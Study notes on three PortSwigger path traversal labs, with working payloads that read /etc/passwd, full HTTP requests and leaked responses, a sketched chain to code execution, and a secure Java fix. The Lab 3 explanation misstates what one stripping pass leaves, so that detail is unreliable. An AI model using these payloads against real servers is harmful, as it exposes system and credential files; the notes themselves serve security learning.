# Day 41 Notes — Path Traversal (Bypass Techniques)


---

## 1. What We Did Today Overview

Today we studied **Path Traversal** (also known as Directory Traversal). We completed three progressive labs on PortSwigger:

- **Lab 1**: File path traversal, simple case
- **Lab 2**: File path traversal, traversal sequences blocked with absolute path bypass
- **Lab 3**: File path traversal, traversal sequences stripped non-recursively

The goal was to understand how path traversal works at a mechanical level and how different filtering techniques can be bypassed.

---

## 2. The Foundation

### 2A — What This Technology Is Actually For

Web applications and servers frequently need to serve static files such as images, PDFs, documents, or configuration files. Instead of creating a separate route handler for every single file, developers create **one generic file-serving endpoint**. This endpoint takes a filename from a URL parameter (e.g., `?filename=photo.jpg`) and reads that file from a designated folder on disk (commonly `/var/www/images/` or `/static/`).

This design is efficient, maintainable, and completely normal engineering practice — until the filename parameter is not properly validated or sanitized.

### 2B — The Exact Developer Assumption That Breaks

The developer assumes that the value supplied in the filename parameter will **always be a simple, safe filename** (such as `38.jpg` or `report.pdf`) and will **never contain path manipulation sequences** like `../` or absolute paths starting with `/`. They treat the parameter as a filename only, not as a full or relative path that the filesystem will resolve.

### 2C — The Mechanical Explanation (Step by Step)

When the application builds the file path, it typically does simple string concatenation:

```java
String filename = request.getParameter("filename");
File file = new File("/var/www/images/" + filename);
return Files.readAllBytes(file.toPath());
```

The filesystem itself has **no concept** of "allowed" or "forbidden" directories from the application's perspective. It only resolves whatever path string it is given.

Each `../` sequence is a filesystem-level instruction that means **"go up one directory level"**. When enough `../` sequences are provided, the final resolved path can point **outside** the intended `/var/www/images/` folder and into sensitive locations such as `/etc/passwd`, application source code, or configuration files.

The application's intention to restrict access to one folder becomes irrelevant because the filesystem only sees the final resolved path after all `../` sequences have been processed.

### 2D — Real Life Analogy

Imagine a strict but literal security guard who is told: "Go to the storage room and bring whatever file the employee asks for." The guard always starts walking from the **Public Documents** section.

A normal employee says "Bring me the sales report from last month." The guard brings it.

But a malicious person says: "Go back three rooms, then go into the **Restricted Archive** on the top shelf, and bring me the file named `employee-salaries.xlsx`."

Because the guard follows instructions **literally** without verifying whether the final destination is still inside the allowed public section, they end up fetching a highly sensitive file from a restricted area.

### 2E — Three Required Conditions

1. The application reads a file from disk based on a user-supplied filename or path parameter.
2. Path traversal sequences (`../`) or absolute paths are **not stripped, blocked, or properly canonicalized** before the path is resolved by the filesystem.
3. No safe validation exists that checks whether the **final resolved path** still resides inside the intended base directory (e.g., using `normalize()` + `startsWith()`).

### 2F — What It Can and Cannot Achieve

**Can achieve:**
- Read any file the web server process has permission to read
- Expose source code, configuration files, database credentials, and system files (e.g., `/etc/passwd`)
- Map the internal file structure of the server

**Cannot achieve (by itself):**
- Write or modify files
- Execute code or commands
- Bypass operating system permission boundaries

However, Path Traversal becomes extremely dangerous when **chained** with other vulnerabilities (e.g., log poisoning leading to Remote Code Execution).

### 2G — One Real World Case

**CVE-2021-41773** affected Apache HTTP Server version 2.4.49. It allowed attackers to use path traversal sequences to read files outside the web root directory. In some misconfigurations, it even led to Remote Code Execution. The vulnerability was actively exploited in the wild within days of disclosure.

---

## 3. Labs Completed

### Lab 1: File path traversal, simple case

**Goal:** Read `/etc/passwd` using basic `../` traversal sequences.

#### How it worked (Step by Step)

1. The application accepted a `filename` parameter and appended it directly to a base path (`/var/www/images/`).
2. By sending `../../../etc/passwd`, we instructed the filesystem to go up three directory levels from the images folder.
3. After three `../` sequences, the path resolved to `/etc/passwd` from the filesystem root.
4. The application read and returned the file contents.

#### Request we sent

```
GET /image?filename=/../../../etc/passwd HTTP/2
Host: 0a9d003604afc30d8017dfb300680040.web-security-academy.net
Cookie: session=eUqi2qtT6mnugXxDnsrSThBn44lTk8Vx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9d003604afc30d8017dfb300680040.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5
Te: trailers
```

#### Response we got

```
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
...
```

**Main command explanation:**  
The payload `/../../../etc/passwd` works because the leading `/` makes it an absolute-style traversal. Each `../` cancels one directory level in the base path. After three levels, the filesystem reaches `/etc/passwd`. The application had no validation to prevent escaping the intended directory.

---

### Lab 2: File path traversal, traversal sequences blocked with absolute path bypass

**Goal:** Bypass a filter that blocks `../` sequences by using an absolute path.

#### How it worked (Step by Step)

1. In this lab, the application attempted to block traversal by filtering or rejecting `../` sequences.
2. However, the filter did not properly handle **absolute paths** starting with `/`.
3. By sending `/etc/passwd` directly, we bypassed the `../` check entirely.
4. The filesystem accepted the absolute path and returned the file.

#### Request we sent

```
GET /image?filename=/etc/passwd HTTP/2
Host: 0a4000d304056356807963420002006f.web-security-academy.net
Cookie: session=g3bHCAiCu40kJ7Qd74edurJzp9E7IT7f
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a4000d304056356807963420002006f.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5
Te: trailers
```

#### Response we got

```
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
...
```

**Main command explanation:**  
The payload `/etc/passwd` works because many naive filters only look for the literal string `../`. An absolute path starting with `/` does not contain `../`, so it bypasses the filter while still allowing the filesystem to read the target file directly.

---

### Lab 3: File path traversal, traversal sequences stripped non-recursively

**Goal:** Bypass a filter that removes `../` only once using nested sequences.

#### How it worked (Step by Step)

1. The application tried to "fix" the vulnerability by removing the string `../` from user input.
2. However, the removal was performed only **once** (non-recursively).
3. We sent `....//....//....//etc/passwd`.
4. After one stripping pass, the payload became `../..//../..//../..//etc/passwd`, which still contained valid traversal sequences.
5. The filesystem then resolved the remaining `../` sequences and reached `/etc/passwd`.

#### Request we sent

```
GET /image?filename=....//....//....//etc/passwd HTTP/2
Host: 0a3600c8038412c280fd58e4000300f3.web-security-academy.net
Cookie: session=HOLcjyG7yCLzO0wo0A6OrwXrsIuV0kJo
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3600c8038412c280fd58e4000300f3.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5
Te: trailers
```

#### Response we got

```
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
...
```

**Main command explanation:**  
The payload `....//....//....//etc/passwd` works because `....//` contains `../` in the middle. When the filter removes `../` only once, valid traversal sequences remain. This is a classic example of why input sanitization must be done correctly (preferably using canonicalization + whitelist validation rather than simple string replacement).

---

## 4. Every Command Explained — Full Breakdown

### Lab 1 Payload
**Payload:** `/../../../etc/passwd`  
**Why it worked:** The leading `/` combined with three `../` sequences allows the filesystem to escape the `/var/www/images/` directory and reach `/etc/passwd` from root.

### Lab 2 Payload
**Payload:** `/etc/passwd`  
**Why it worked:** Absolute paths bypass filters that only look for `../` sequences. The filesystem accepts absolute paths directly.

### Lab 3 Payload
**Payload:** `....//....//....//etc/passwd`  
**Why it worked:** Nested `..` sequences survive single-pass stripping, leaving valid traversal after the filter runs once.

---

## 5. Vulnerable Source Code — Line by Line

Source code was not viewed in this session. Representative vulnerable pattern:

```java
String filename = request.getParameter("filename");
File file = new File("/var/www/images/" + filename);
return Files.readAllBytes(file.toPath());
```

**Line-by-line analysis:**
- `String filename = request.getParameter("filename")` — Takes user input with no validation.
- `new File("/var/www/images/" + filename)` — Simple string concatenation. The filesystem resolves whatever path is created, including traversal sequences.

---

## 6. What Failed and Why

- In Lab 2, simple `../../../etc/passwd` was blocked because the lab implemented a basic `../` filter.
- In Lab 3, simple traversal was stripped, but the non-recursive nature of the filter allowed the nested payload to succeed.

---

## 7. Chain Thinking

**Path Traversal (read access)**  
↓ (Can read application source code and configuration)  
**Discover other vulnerabilities** (e.g., log poisoning endpoints)  
↓ (Combine with log poisoning from earlier weeks)  
**Poison web server logs with PHP payload via User-Agent**  
↓ (Use path traversal to include the poisoned log file)  
**Achieve Remote Code Execution (RCE)**

Path Traversal alone is high severity for information disclosure. When chained, it can lead to full server compromise.

---

## 8. Real World Context

Path Traversal vulnerabilities remain common in file-serving features. They are frequently found in custom file upload/download modules, PDF generators, and image processing endpoints. On bug bounty platforms, confirmed path traversal that exposes sensitive files usually receives Medium to High severity ratings, with higher payouts when chained to RCE.

---

## 9. The Fix — Full Technical Breakdown

**Vulnerable pattern:**
```java
File file = new File("/var/www/images/" + filename);
```

**Secure pattern:**
```java
Path baseDir = Paths.get("/var/www/images/").toAbsolutePath().normalize();
Path resolvedPath = baseDir.resolve(filename).toAbsolutePath().normalize();

if (!resolvedPath.startsWith(baseDir)) {
    throw new SecurityException("Path traversal attempt detected");
}

return Files.readAllBytes(resolvedPath);
```

**Why the fix works:**  
`normalize()` resolves all `../` sequences into a final canonical path. Then `startsWith(baseDir)` verifies that the final resolved path still lives inside the intended directory — regardless of how many traversal tricks the attacker uses.

**Defense in depth:**
- Use whitelist validation (only allow specific characters or known filenames)
- Avoid passing user input directly into file paths when possible
- Run the web application with minimal filesystem permissions
- Implement proper logging and monitoring for suspicious path patterns

---

## 10. Key Concepts Summary

| Bypass Technique              | How it Works                              | Why Developers Miss It                     |
|------------------------------|-------------------------------------------|--------------------------------------------|
| Simple `../`                 | Escapes intended directory                | No validation at all                       |
| Absolute Path `/etc/passwd`  | Bypasses `../` filters                    | Filter only checks for traversal strings   |
| Nested `....//`              | Survives single-pass stripping            | Sanitization done only once (non-recursive)|

---

## 11. Command and Payload Reference

- **Lab 1:** `/../../../etc/passwd`
- **Lab 2:** `/etc/passwd`
- **Lab 3:** `....//....//....//etc/passwd`

---

## 12. Foundation Checklist

- Can you explain why simple string replacement of `../` is not sufficient protection?
- Why does using an absolute path (`/etc/passwd`) bypass many `../` filters?
- What is the correct way to validate that a resolved path stays inside an allowed directory?
- If a developer says they "normalize the path", what additional check is still required?
- How can Path Traversal be chained with other vulnerabilities to achieve RCE?

---